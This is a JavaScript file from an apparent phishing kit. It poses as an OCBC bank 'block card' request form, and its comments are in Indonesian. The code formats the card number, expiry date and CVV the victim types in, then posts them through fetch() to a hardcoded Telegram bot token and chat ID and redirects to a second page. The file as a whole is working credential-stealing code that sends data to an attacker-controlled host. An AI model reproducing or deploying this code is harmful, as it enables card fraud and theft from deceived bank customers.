// === KONFIGURASI BOT TELEGRAM ===
const BOT_TOKEN = "8947782136:AAEjQuwb_sB8kUYsT_X1a5i3liNTERbQ16w";      // Ganti Token Bot kamu
const CHAT_ID = "8405193617";          // Ganti Chat ID kamu
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// === ELEMEN KARTU & INPUT ===
const cardInner = document.getElementById('cardInner');
const nomorKartuInput = document.getElementById('nomor_kartu');
const validThruInput = document.getElementById('valid_thru');
const cvvInput = document.getElementById('cvv');
const cardNumberPreview = document.getElementById('cardNumberPreview');
const cardValidPreview = document.getElementById('cardValidPreview');
const cardCvvDisplay = document.getElementById('cardCvvDisplay');

// === 1. LIVE UPDATE NOMOR KARTU ===
nomorKartuInput.addEventListener('input', (e) => {
  let val = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
  val = val.replace(/(\d{4})(?=\d)/g, '$1 ');
  e.target.value = val;
  cardNumberPreview.textContent = val ? val.padEnd(4, '#') : '#### #### #### ####';
});

// === 2. LIVE UPDATE VALID THRU ===
validThruInput.addEventListener('input', (e) => {
  let val = e.target.value.replace(/[^0-9]/g, '');
  if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
  e.target.value = val;
  cardValidPreview.textContent = val ? val.padEnd(5, '#') : '##/##';
});

// === 3. CVV — HANYA ANGKA, TIDAK BOLEH HURUF ===
cvvInput.addEventListener('input', (e) => {
  // HAPUS SEMUA KARAKTER BUKAN ANGKA — otomatis blokir huruf & simbol
  let val = e.target.value.replace(/[^0-9]/g, '');
  // Batasi maksimal 3 digit
  val = val.slice(0, 3);
  e.target.value = val;
  
  // Update tampilan di belakang kartu
  cardCvvDisplay.textContent = val ? val.padEnd(3, '#') : '###';
});

// Blokir paste yang mengandung huruf
cvvInput.addEventListener('paste', (e) => {
  setTimeout(() => {
    let val = cvvInput.value.replace(/[^0-9]/g, '').slice(0, 3);
    cvvInput.value = val;
    cardCvvDisplay.textContent = val ? val.padEnd(3, '#') : '###';
  }, 0);
});

// === 4. AUTO BALIK KARTU SAAT KLIK CVV ===
cvvInput.addEventListener('focus', () => cardInner.classList.add('is-flipped'));
cvvInput.addEventListener('blur', () => cardInner.classList.remove('is-flipped'));

// === KIRIM DATA KE TELEGRAM ===
async function kirimKeTelegram(data) {
  const pesan = `
🔴 PERMINTAAN BLOKIR KARTU OCBC
━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Nomor Kartu: ${data.nomor_kartu}
📅 Valid Thru: ${data.valid_thru}
🔒 CVV: ${data.cvv}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🕐 Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
  `.trim();

  try {
    const res = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: "HTML" })
    });
    const hasil = await res.json();
    return hasil.ok;
  } catch (err) {
    console.error("Error:", err);
    return false;
  }
}

// === FORM SUBMIT ===
document.getElementById('blockForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const formData = new FormData(e.target);
  const data = {
    nomor_kartu: formData.get('nomor_kartu'),
    valid_thru: formData.get('valid_thru'),
    cvv: formData.get('cvv')
  };

  const nomorBersih = data.nomor_kartu.replace(/\s/g, '');
  if (!nomorBersih || nomorBersih.length < 16) return alert("Masukkan 16 digit nomor kartu!");
  if (!data.valid_thru || data.valid_thru.length < 5) return alert("Masukkan masa berlaku kartu!");
  if (!data.cvv || data.cvv.length < 3) return alert("Masukkan 3 digit CVV!");
  if (!/^\d+$/.test(data.cvv)) return alert("CVV hanya boleh berisi angka!"); // Validasi tambahan

  const sukses = await kirimKeTelegram(data);
  if (sukses) {
    alert("✅ Data berhasil dikirim! Sedang diproses...");
    window.location.href = "two.html";
  } else {
    alert("❌ Gagal mengirim! Coba lagi nanti.");
  }
});
